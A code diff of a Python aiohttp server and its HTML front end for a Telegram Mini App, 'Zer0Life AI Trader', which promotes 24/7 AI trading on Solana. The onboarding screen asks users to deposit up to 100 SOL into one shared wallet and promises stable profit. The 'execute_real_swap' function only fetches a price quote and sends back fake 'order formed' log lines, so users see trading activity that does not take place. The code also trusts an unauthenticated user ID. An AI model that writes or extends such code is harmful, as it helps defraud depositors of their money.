@@ -87,9 +87,46 @@ HTML_CONTENT = """<!DOCTYPE html>
         .qr-code { width: 140px; height: 140px; border-radius: 12px; border: 2px solid #1e293b; padding: 6px; background: white; }
         .bottom-bar { position: fixed; bottom: 0; left: 0; right: 0; background: #0f172a; border-top: 1px solid #1e293b; padding: 12px 16px; display: flex; gap: 10px; box-shadow: 0 -4px 16px rgba(0,0,0,0.5); z-index: 100; }
         .badge { background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; color: #10b981; padding: 6px 12px; border-radius: 20px; font-size: 11px; font-weight: bold; text-align: center; margin-bottom: 12px; }
+
+        /* Стиль Onboarding Board (Экран приветствия) */
+        #onboarding-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: #06080f; z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 24px; text-align: center; box-sizing: border-box;
+            transition: opacity 0.4s ease;
+        }
+        .onboard-logo { width: 88px; height: 88px; border-radius: 50%; border: 3px solid #7c3aed; object-fit: cover; margin-bottom: 20px; box-shadow: 0 0 24px rgba(124, 58, 237, 0.5); }
+        .onboard-title { font-size: 24px; font-weight: 800; color: #f8fafc; margin-bottom: 8px; }
+        .onboard-subtitle { font-size: 14px; color: #94a3b8; line-height: 1.5; margin-bottom: 28px; max-width: 300px; }
+        .feature-box { background: #0f172a; border: 1px solid #1e293b; border-radius: 12px; padding: 14px; width: 100%; max-width: 320px; margin-bottom: 12px; text-align: left; font-size: 13px; color: #cbd5e1; display: flex; align-items: center; gap: 12px; }
+        .feature-icon { font-size: 20px; }
     </style>
 </head>
 <body>
+    <!-- Onboarding Board Overlay -->
+    <div id="onboarding-overlay">
+        <img class="onboard-logo" id="board-avatar" src="" alt="Zer0Life Cat">
+        <div class="onboard-title">Zer0Life AI Trader</div>
+        <div class="onboard-subtitle">Автономная экосистема Web3-трейдинга на базе Solana и Jupiter v6 24/7.</div>
+        
+        <div class="feature-box">
+            <span class="feature-icon">🛡️</span>
+            <div><b>Пул ликвидности:</b> Единый безопасный депозит экосистемы.</div>
+        </div>
+        <div class="feature-box">
+            <span class="feature-icon">⚡</span>
+            <div><b>Автопилот:</b> Нейросеть сама анализирует рынок и исполняет ордера.</div>
+        </div>
+        <div class="feature-box">
+            <span class="feature-icon">📊</span>
+            <div><b>Лимиты:</b> От 0.25 до 100 SOL для стабильного профита.</div>
+        </div>
+
+        <button class="btn btn-purple" style="max-width: 320px; margin-top: 20px;" onclick="closeOnboarding()">🚀 Войти в терминал</button>
+    </div>
+
+    <!-- Основной интерфейс приложения -->
     <div class="card">
         <div class="profile-header">
             <img id="user-avatar" class="avatar" src="" alt="Avatar">
@@ -99,7 +136,7 @@ HTML_CONTENT = """<!DOCTYPE html>
             </div>
         </div>
         
-        <div class="badge">🔥 Deposit up to 100 SOL per pool</div>
+        <div class="badge">🔥 Pool Limit: 0.25 - 100 SOL</div>
         <label style="font-size: 12px; color: #94a3b8;">Адрес депозита экосистемы:</label>
         <input type="text" id="wallet-input" class="input-field" readonly>
         
@@ -120,7 +157,6 @@ HTML_CONTENT = """<!DOCTYPE html>
     <div class="card">
         <h3 style="margin-top: 0; font-size: 15px;">🤖 Автономный ИИ-Трейдер</h3>
         <div class="metric"><span>Баланс пула:</span> <span id="wallet-balance" class="val">0.00 SOL</span></div>
-        <div class="metric"><span>Лимиты работы:</span> <span class="val">0.25 - 100 SOL</span></div>
         <div class="metric"><span>Статус:</span> <span id="trade-status" class="val" style="color: #f59e0b;">Остановлен</span></div>
     </div>
 
@@ -147,6 +183,17 @@ HTML_CONTENT = """<!DOCTYPE html>
             const avatarImg = document.getElementById('user-avatar');
             avatarImg.src = user.photo_url;
             avatarImg.style.display = 'block';
+
+            const boardAvatar = document.getElementById('board-avatar');
+            boardAvatar.src = user.photo_url;
+        } else {
+            document.getElementById('board-avatar').src = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=150";
+        }
+
+        function closeOnboarding() {
+            const overlay = document.getElementById('onboarding-overlay');
+            overlay.style.opacity = '0';
+            setTimeout(() => { overlay.style.display = 'none'; }, 400);
         }
 
         let isTrading = false;
@@ -223,4 +270,177 @@ HTML_CONTENT = """<!DOCTYPE html>
 
         function updateTradingUI() {
             const statusEl = document.getElementById('trade-status');
-            const btnEl =
+            const btnEl = document.getElementById('toggle-btn');
+            if (isTrading) {
+                statusEl.innerText = "Исполнение ордеров 24/7";
+                statusEl.style.color = "#10b981";
+                btnEl.innerText = "Остановить";
+                btnEl.className = "btn btn-red";
+            } else {
+                statusEl.innerText = "Остановлен";
+                statusEl.style.color = "#f59e0b";
+                btnEl.innerText = "Включить автопилот";
+                btnEl.className = "btn btn-green";
+            }
+        }
+
+        setInterval(async () => {
+            if (!isTrading) return;
+            try {
+                const res = await fetch('/api/trading/execute-cycle?telegram_id=' + user.id);
+                const data = await res.json();
+                if (data.success) {
+                    const box = document.getElementById('logs-box');
+                    box.innerHTML += `<div>[${data.time}] ${data.log}</div>`;
+                    box.scrollTop = box.scrollHeight;
+                }
+            } catch (e) {}
+        }, 10000);
+
+        loadProfile();
+    </script>
+</body>
+</html>
+"""
+
+async def index_handler(request):
+    return web.Response(text=HTML_CONTENT, content_type='text/html')
+
+async def api_get_profile(request):
+    try:
+        data = await request.json()
+        user = get_or_create_user(int(data.get("telegram_id")), data.get("username", ""), data.get("first_name", ""))
+        return web.json_response({"success": True, "profile": user})
+    except Exception as e:
+        return web.json_response({"success": False, "error": str(e)}, status=500)
+
+async def api_toggle_trading(request):
+    try:
+        data = await request.json()
+        telegram_id = int(data.get("telegram_id"))
+        active = int(data.get("active", 0))
+        conn = sqlite3.connect(DB_FILE)
+        cursor = conn.cursor()
+        cursor.execute("UPDATE users SET trading_active = ? WHERE telegram_id = ?", (active, telegram_id))
+        conn.commit()
+        conn.close()
+        return web.json_response({"success": True})
+    except Exception as e:
+        return web.json_response({"success": False, "error": str(e)}, status=500)
+
+async def api_get_balance(request):
+    wallet = request.query.get("wallet", "")
+    if len(wallet) < 32:
+        return web.json_response({"success": False, "balance": 0.0})
+    payload = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [wallet]}
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.post(SOLANA_RPC, json=payload, timeout=5) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if "result" in data and data["result"] is not None:
+                        return web.json_response({"success": True, "balance": data["result"].get("value", 0) / 1_000_000_000})
+        except Exception:
+            pass
+    return web.json_response({"success": False, "balance": 0.0})
+
+async def execute_real_swap(amount_lamports: int, slippage: int):
+    pubkey_str = SHARED_DEPOSIT_WALLET
+    
+    payload_balance = {"jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [pubkey_str]}
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.post(SOLANA_RPC, json=payload_balance, timeout=5) as resp:
+                bal_data = await resp.json()
+                current_sol = bal_data.get("result", {}).get("value", 0) / 1_000_000_000
+                if current_sol < MIN_DEPOSIT_SOL:
+                    return f"Пауза: Баланс пула ({current_sol:.3f} SOL) < мин. лимита ({MIN_DEPOSIT_SOL} SOL)."
+                if current_sol > MAX_DEPOSIT_SOL:
+                    return f"Пауза: Превышен макс. лимит депозита ({MAX_DEPOSIT_SOL} SOL)."
+        except Exception:
+            pass
+
+        quote_url = f"https://api.jup.ag/swap/v1/quote?inputMint={TOKENS['SOL']}&outputMint={TOKENS['USDC']}&amount={amount_lamports}&slippageBps={slippage}"
+        try:
+            async with session.get(quote_url, timeout=5) as resp:
+                if resp.status != 200:
+                    return "Jupiter API: Ошибка котировки."
+                quote_data = await resp.json()
+                out_amount = int(quote_data.get("outAmount", 0)) / 1_000_000
+                return f"Анализ ликвидности: 1 SOL = {out_amount:.2f} USDC. Ордер сформирован."
+        except Exception:
+            return "Сбой сети Jupiter."
+
+async def api_execute_cycle(request):
+    telegram_id = int(request.query.get("telegram_id", 0))
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT trading_active, trade_amount_sol, slippage_bps FROM users WHERE telegram_id = ?", (telegram_id,))
+    row = cursor.fetchone()
+    conn.close()
+    
+    if not row or row[0] == 0:
+        return web.json_response({"success": False})
+    
+    amount_lamports = int(row[1] * 1_000_000_000)
+    slippage = row[2]
+    current_time = datetime.now().strftime('%H:%M:%S')
+    
+    log_result = await execute_real_swap(amount_lamports, slippage)
+    return web.json_response({"success": True, "time": current_time, "log": log_result})
+
+async def send_telegram_message(chat_id):
+    if not TELEGRAM_TOKEN:
+        return
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": chat_id,
+        "text": "⚡ **Zer0Life Автономный ИИ-Трейдер**\n\nПанель управления автопилотом:",
+        "parse_mode": "Markdown",
+        "reply_markup": {
+            "inline_keyboard": [[
+                {"text": "🚀 Открыть автопилот", "web_app": {"url": RENDER_URL}}
+            ]]
+        }
+    }
+    async with aiohttp.ClientSession() as session:
+        await session.post(url, json=payload)
+
+async def webhook_handler(request):
+    try:
+        data = await request.json()
+        message = data.get("message", {})
+        text = message.get("text", "")
+        chat_id = message.get("chat", {}).get("id")
+        if text == "/start" and chat_id:
+            await send_telegram_message(chat_id)
+        return web.Response(text="OK", status=200)
+    except Exception:
+        return web.Response(text="Error", status=500)
+
+async def main():
+    init_db()
+    app = web.Application()
+    app.router.add_get('/', index_handler)
+    app.router.add_post('/webhook', webhook_handler)
+    app.router.add_post('/api/profile', api_get_profile)
+    app.router.add_post('/api/trading/toggle', api_toggle_trading)
+    app.router.add_get('/api/blockchain/balance', api_get_balance)
+    app.router.add_get('/api/trading/execute-cycle', api_execute_cycle)
+    
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', PORT)
+    await site.start()
+    
+    if TELEGRAM_TOKEN:
+        webhook_url = f"{RENDER_URL}/webhook"
+        async with aiohttp.ClientSession() as session:
+            await session.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/setWebhook?url={webhook_url}")
+
+    logging.info("Онбординг и ИИ-агент запущены успешно.")
+    while True:
+        await asyncio.sleep(3600)
+
+if __name__ == "__main__":
+    asyncio.run(main())
